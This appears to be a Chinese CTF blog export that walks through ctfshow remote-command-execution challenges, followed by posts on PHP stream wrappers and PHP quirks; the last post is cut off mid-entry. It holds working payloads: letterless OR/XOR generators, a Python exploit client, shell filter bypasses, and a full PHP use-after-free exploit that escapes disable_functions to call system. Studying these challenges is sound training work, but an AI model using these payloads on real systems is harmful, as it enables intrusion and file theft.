class="php">&lt;?php/*# -*- coding: utf-8 -*-# @Author: Y4tacker# @Date:   2020-11-21 20:31:22*///或function orRce($par1, $par2)&#123;    $result = (urldecode($par1)|urldecode($par2));    return $result;&#125;//异或function xorRce($par1, $par2)&#123;    $result = (urldecode($par1)^urldecode($par2));    return $result;&#125;//取反function negateRce()&#123;    fwrite(STDOUT,&#39;[+]your function: &#39;);    $system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));    fwrite(STDOUT,&#39;[+]your command: &#39;);    $command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));    echo &#39;[*] (~&#39;.urlencode(~$system).&#39;)(~&#39;.urlencode(~$command).&#39;);&#39;;&#125;//mode=1代表或，2代表异或，3代表取反//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式function generate($mode, $preg=&#39;/[0-9]/i&#39;)&#123;    if ($mode!=3)&#123;        $myfile = fopen(&quot;rce.txt&quot;, &quot;w&quot;);        $contents = &quot;&quot;;        for ($i=0;$i&lt;256;$i++)&#123;            for ($j=0;$j&lt;256;$j++)&#123;                if ($i&lt;16)&#123;                    $hex_i = &#39;0&#39;.dechex($i);                &#125;else&#123;                    $hex_i = dechex($i);                &#125;                if ($j&lt;16)&#123;                    $hex_j = &#39;0&#39;.dechex($j);                &#125;else&#123;                    $hex_j = dechex($j);                &#125;                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                    echo &quot;&quot;;                &#125;else&#123;                    $par1 = &quot;%&quot;.$hex_i;                    $par2 = &#39;%&#39;.$hex_j;                    $res = &#39;&#39;;                    if ($mode==1)&#123;                        $res = orRce($par1, $par2);                    &#125;else if ($mode==2)&#123;                        $res = xorRce($par1, $par2);                    &#125;                    if (ord($res)&gt;=32&amp;ord($res)&lt;=126)&#123;                        $contents=$contents.$res.&quot; &quot;.$par1.&quot; &quot;.$par2.&quot;\n&quot;;                    &#125;                &#125;            &#125;        &#125;        fwrite($myfile,$contents);        fclose($myfile);    &#125;else&#123;        negateRce();    &#125;&#125;generate(1,&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;);//1代表模式，后面的是过滤规则</code></pre><p>再利用羽师傅的脚本</p><pre><code class="python"># -*- coding: utf-8 -*-import requestsimport urllibfrom sys import *import osos.system(&quot;php E:\Download\phpstudy_pro\WWW\rce.php&quot;)  # 没有将php写入环境变量需手动运行if (len(argv) != 2):    print(&quot;=&quot; * 50)    print(&#39;USER：python exp.py &lt;url&gt;&#39;)    print(&quot;eg：  python exp.py http://ctf.show/&quot;)    print(&quot;=&quot; * 50)    exit(0)url = argv[1]def action(arg):    s1 = &quot;&quot;    s2 = &quot;&quot;    for i in arg:        f = open(r&quot;E:\Download\phpstudy_pro\WWW\rce.txt&quot;, &quot;r&quot;)#填txt的文件位置        while True:            t = f.readline()            if t == &quot;&quot;:                break            if t[0] == i:                # print(i)                s1 += t[2:5]                s2 += t[6:9]                break        f.close()    output = &quot;(\&quot;&quot; + s1 + &quot;\&quot;|\&quot;&quot; + s2 + &quot;\&quot;)&quot;    return (output)while True:    param = action(input(&quot;\n[+] your function：&quot;)) + action(input(&quot;[+] your command：&quot;))    data = &#123;        &#39;c&#39;: urllib.parse.unquote(param)    &#125;    r = requests.post(url, data=data)    print(&quot;\n[*] result:\n&quot; + r.text)</code></pre><p>上面就注意下php脚本的位置和生成的rce.txt的位置还有接受的参数比如上面是c，换个参数就把c改了就行</p><p>那么完整流程就是</p><pre><code>1.先改一下php脚本中generate函数里的参数，也就是设置模式和正则2.python rce_.py url</code></pre><p>可以看看p神的博客</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p><h2 id="类型三-接受并过滤传入的变量拼接命令执行（system函数）"><a href="#类型三-接受并过滤传入的变量拼接命令执行（system函数）" class="headerlink" title="类型三:接受并过滤传入的变量拼接命令执行（system函数）"></a>类型三:接受并过滤传入的变量拼接命令执行（system函数）</h2><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><p>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 也可以写成“1&gt; &#x2F;dev&#x2F;null 2&gt; &amp;1”,我们写入的命令的执行结果会被黑洞吞掉。</p><p>分隔符变量拼接可以用分隔符来控制后面语句的执行</p><p>分割符</p><pre><code>; 分号顺序执行&amp;&amp; 顺序执行|| 前边执行成功则不再执行换行符(在url中是%0a)&amp; (在url中是%26)</code></pre><p>注意，通过url传递&amp;&amp;时要记得urlencode为%26%26，否则会被当作url参数的分隔符而不是shell命令的分隔符。</p><pre><code>payload c=cat flag.php%26</code></pre><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>过滤了cat，用tac替换</p><pre><code>paylaod c=tac flag.php%26</code></pre><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><pre><code>payload c=tac f*%26</code></pre><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><p>用%09替换空格</p><pre><code>paylaod c=tac%09f*%26</code></pre><p>常见的空格替换</p><pre><code>%09，%20，$IFS、$&#123;IFS&#125;、$IFS$9，&#123;tac,*&#125;，&lt;，&lt;&gt;</code></pre><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><p>过滤了*和数字</p><pre><code>payload c=tac%09fla&#39;&#39;g.php||        c=tac%09fl[a-z]g.php||</code></pre><p>%09解码后是水平制表符，而不是数字</p><h3 id="web47-49"><a href="#web47-49" class="headerlink" title="web47-49"></a>web47-49</h3><pre><code>payload c=tac%09fla&#39;&#39;g.php||</code></pre><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><p>屏蔽了x09和x26，也就是屏蔽了%09和%26，用其他方式绕过空格,这关用不了[a-z]了</p><pre><code>payload c=tac&lt;&gt;fl\ag.php||</code></pre><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><p>tac被ban了</p><pre><code>payload c=ta&#39;&#39;c&lt;&gt;fla\g.php||        c=ta\c&lt;&gt;fla\g.php||        c=nl&lt;&gt;fla\g.php||</code></pre><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>&lt;&gt;尖括号被过滤了但是$没过滤</p><pre><code>?c=ls$&#123;IFS&#125;../../../||   //flag在根目录c=ta\c$&#123;IFS&#125;../../../fl\ag||</code></pre><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><p>多过滤了wget，没影响</p><pre><code>payload ?c=ta\c$&#123;IFS&#125;fla\g.php</code></pre><p>注意，这一关没有了黑洞</p><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p>1.可以使用grep命令：</p><pre><code>?c=grep$&#123;IFS&#125;ctf$&#123;IFS&#125;fl?g.php</code></pre><p>2.可以使用mv命令</p><pre><code>?c=mv$&#123;IFS&#125;fl?g.php$&#123;IFS&#125;a.txt  //直接访问a.txt</code></pre><ol start="3"><li>&#x2F;bin下存放一些普通的基本命令，可以使用通配符去调用命令</li></ol><pre><code>?c=/bin/?at$&#123;IFS&#125;f???????</code></pre><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><p>方法一：通过匹配bin下存在的命令进行读取flag。<br> bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br> 我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是&#x2F;bin&#x2F;ls</p><pre><code>payload ?c=/???/????64 ????.???//也就是?c=/bin/base64 flag.php</code></pre><p>方法二：bzip2的使用</p><pre><code>payload：?c=/???/???/????2 ????.???//也就是/usr/bin/bzip2 flag.php然后访问/flag.php.bz2进行下载获得flag.php</code></pre><p>注:<strong>&#x2F;bin</strong> 是所有用户都可以访问并执行的可执行程序。包括超级用户及一般用户。<br>      <strong>&#x2F;usr&#x2F;bin</strong> 是系统安装时自带的一些可执行程序。即系统程序。</p><p>方法三：</p><p>可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在&#x2F;tmp&#x2F;php?????[@-[]（上传的文件在linux下面一般保存在&#x2F;tmp&#x2F;php??????一般后面的6个字符是五个小写加一个大写，大写可以通过linux的匹配符去匹配，不过因为是随机生成的大写字母，不一定每次都是大写，可以多试几下。）<br>注意：通过.去执行sh命令不需要有执行权限<br>需要先构造一个post上传文件的数据包。</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt; &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>然后抓包并修改文件内容改为shell命令，并且传入c参数：</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/155054.png" class=""><p>可以看看p神的无字母数字提高篇<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><p>过滤了数字，使用前一关的第三种方法即可</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>这关需要构造出36。</p><p>$(()) 代表做一次运算，因为里面为空，也表示值为0</p><p>$((~$(())))对0作取反运算，值为-1（如果对a按位取反，则得到的结果为-(a+1)）<br>$(($((~$(())))$((~$(()))))) -1-1，也就是(-1)+(-1)为-2，所以值为-2</p><p>写个脚本生成payload:</p><pre><code class="php">data = &quot;$((~$((&quot;+&quot;$((~$(())))&quot;*37+&quot;))))&quot;print(data)</code></pre><h3 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h3><p>禁用了一些函数，直接读取文件</p><p>首先获取文件路径</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/104435.png" class=""><pre><code>c=print_r(scandir(dirname(&#39;./&#39;)));c=var_dump(scandir(&#39;./&#39;));c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;c=$a=&quot;glob:///*&quot;;if($b=opendir($a))&#123;while(($file=readdir($b))!==false)&#123;echo $file.&quot;\n&quot;;&#125;&#125;c=$a=opendir(&quot;./&quot;); while (($file = readdir($a)) !== false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;c=$a=dir(getcwd());while ($file = $a-&gt;read())&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;</code></pre><p>php读取文件函数：</p><pre><code>file()把整个文件读入一个数组中readfile()读取文件fpassthru()读取文件highlight_file()读文件show_source()同上base64_decode()base64解码strrev()反转字符串php_strip_whitespace()  返回删除注释和空格后的PHP源码file_get_contents()   将整个文件读入一个字符串include($filename); // 非php代码include_once($filename); // 非php代码require($filename); // 非php代码require_once($filename); // 非php代码示例：echo file_get_contents(&quot;flag.php&quot;);   print_r(file(&#39;flag.php&#39;));var_dump(file(&#39;flag.php&#39;));include(&#39;flag.php&#39;);echo $flag;var_dump(glob(&quot;*flag*&quot;)); // 寻找与模式匹配的文件路径include(&#39;flag.php&#39;);var_dump(get_defined_vars()); //get_defined_vars()函数返回由所有已定义变量所组成的数组。</code></pre><p>通过fopen读取文件内容</p><pre><code>fread()fread($file,100)     读取打开的文件，读取100个字节fgets()读取一行fgetc()读取一个字符fgetss()fgetcsv()读取一行gpassthru()payload:c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;//一行一行读取c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;//一个一个字符读取c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;</code></pre><p>也可以通过复制，重命名读取php文件内容</p><pre><code>copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);             rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</code></pre><p>还可以直接用蚁剑连接。</p><h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p>show_source()被ban了，使用highlight_file()，这次的flag在flag.txt里，先查目录，再进文件。</p><pre><code>c=print_r(scandir(&#39;../../../&#39;));c=highlight_file(&#39;../../../flag.txt&#39;);</code></pre><h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><p>print_r被ban了</p><pre><code>c=var_dump(scandir(&#39;../../../&#39;));c=highlight_file(&#39;../../../flag.txt&#39;);</code></pre><h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><p>highlight_file()被ban了，但因为flag在txt里，所以可以用include()</p><pre><code>c=var_dump(scandir(&#39;../../../&#39;));c=include(&#39;../../../flag.txt&#39;);</code></pre><h3 id="web69-70"><a href="#web69-70" class="headerlink" title="web69-70"></a>web69-70</h3><p>print_r()和var_dump()都被ban了，用其他方式读目录</p><pre><code>c=$a=opendir(&#39;./&#39;);while(($file=readdir($a))!==false)&#123;echo $file.“&lt;/br&gt;”;&#125;;c=include(&#39;/flag.txt&#39;);</code></pre><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>下载附件</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/212130.png" class=""><pre><code>ob_get_contents — 返回输出缓冲区的内容 ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</code></pre><pre><code>payload c=include(&quot;/flag.txt&quot;);exit();</code></pre><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>尝试读取根目录</p><pre><code>c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit();</code></pre><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/215446.png" class=""><p>open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。<br> disable_functions：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空。<br> ini_set()用于设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。但是这题也给ban了。<br> 那么可以使用glob伪协议绕过open_basedir</p><pre><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit();</code></pre><p>然后可以看到flag文件名为flag0.txt，但是由于open_basedir的限制，还是不可以直接include进来，需要想其它的办法。使用UAF。脚本如下：记得要把c&#x3D;之后的内容url编码：</p><pre><code>c=function ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;= 8;        &#125;    &#125;    function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;                 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;                 $text_size = $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                              if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                    if($deref != 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln = new Vuln();        $vuln-&gt;a = $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc = 10;     $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc = $backtrace[1][&#39;args&#39;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();#需要通过url编码哦</code></pre><h3 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h3><p>扫描目录</p><pre><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit();c=$d=opendir(&quot;../../../&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit(); //跟着别的教程走了半天，最后发现这两关没有被open_basedir限制</code></pre><p>直接用include</p><pre><code>c=include(&quot;/flagc.txt&quot;);exit(0);c=require(&quot;/flagc.txt&quot;);exit(0);</code></pre><h3 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h3><p>直接include()不行了，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag</p><pre><code>c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</code></pre><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>看大佬说是要用到使用PHP7.4以上才有的FFI进行命令执行</p><pre><code>$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);//创建一个system对象$a=&#39;/readflag &gt; 1.txt&#39;;//没有回显的$ffi-&gt;system($a);//通过$ffi去调用system函数</code></pre><p>参考：<a href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><img src="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/224159.png" class=""><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>p:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file()、include()、highlight_file()和file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p><p>简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p><p>php:&#x2F;&#x2F;filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。</p><p><strong>协议参数</strong>：</p><img src="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/120759.png" class=""><p><strong>过滤器</strong></p><p>这里只例举常用过滤器，详情请参考<a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p><img src="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/123006.png" class=""><p>常用：</p><pre><code>1.php://filter/read=convert.base64-encode/resource=index.php2.php://filter/resource=index.php</code></pre><p>利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。</p><h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与<strong>包含函数</strong>结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p><p>用法：</p><pre><code class="awk">data://text/plain,data://text/plain;base64,</code></pre><p>格式：data:资源类型(MIME类型);编码,内容</p><p>示例：</p><pre><code>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>data类型扩展</p><pre><code>data:,&lt;文本数据&gt;data:text/plain,&lt;文本数据&gt;data:text/html,&lt;HTML代码&gt;data:text/html;base64,&lt;base64编码的HTML代码&gt;data:text/css,&lt;CSS代码&gt;data:text/css;base64,&lt;base64编码的CSS代码&gt;data:text/javascript,&lt;Javascript代码&gt;data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;data:image/gif;base64,base64编码的gif图片数据data:image/png;base64,base64编码的png图片数据data:image/jpeg;base64,base64编码的jpeg图片数据data:image/x-icon;base64,base64编码的icon图片数据</code></pre><h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p><strong>php:&#x2F;&#x2F;input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p><p>例如：</p><pre><code>http://127.0.0.1/cmd.php?cmd=php://inputPOST数据：&lt;?php phpinfo();?&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php特性(ctfshow)</title>
      <link href="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/"/>
      <url>/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><p>preg_match()只能处理字符串，当传入的是数组时将会返回false</p><p><strong>intval(mixed $value, int $base &#x3D; 10): int</strong></p><p>通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 <strong>intval()</strong> 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/155817.png" class=""><p>注：除非value是一个字符串，否则base不会起作用</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/155907.png" class=""><pre><code>payload:?num[]=1</code></pre><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><p>还是考察intval函数，看源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/161305.png" class=""><pre><code>payload:?num=0x117c      #0x117c是4476的16进制</code></pre><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><p>先看源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/213407.png" class=""><p>首先是：</p><p>if(preg_match(‘&#x2F;^php$&#x2F;im’, $a))</p><p>&#x2F;^php$&#x2F;im 表示用php匹配开头和结尾，不区分大小写，并且多行匹配</p><p>再次：</p><p>if(preg_match(‘&#x2F;^php$&#x2F;i’, $a))</p><p>与上面的区别是没有多行匹配，这可以用到Apache HTTPD换行解析漏洞（CVE-2017-15715）–(<a href="https://blog.csdn.net/qq_46091464/article/details/108278486">https://blog.csdn.net/qq_46091464/article/details/108278486</a>)</p><pre><code>payload:?cmd=abc%0aphp</code></pre><p>a%0aphp，首先是preg_match中的$(匹配结尾)匹配a%0aphp中的换行符，这个时候会匹配到%0a（将%0a当作换行），那么a%0aphp后面的php因为preg_match函数有个&#x2F;m(匹配多行)就是单独的一行了，满足第一个if，要求行开始和结尾都是php</p><p>其次是第二个if，第二个if要求$a中开头和结尾没有php，而这个preg_match函数中没有&#x2F;m匹配多行，所以就直接匹配abc，abc不满足第二个if，所以输出flag</p><pre><code>在php中，/m表示爱看i其多行匹配模式，开启多行匹配模式之后^和$的含义就发生了变化，没开启多行模式之前（即单行匹配模式），^和$是匹配字符串的开始和结尾，开启多行模式之后，多行模式^和$可以匹配每行的开头和结尾，所以上述payload里卖弄含有换行符，被当作两行处理，一行匹配ok即可</code></pre><h3 id="web92"><a href="#web92" class="headerlink" 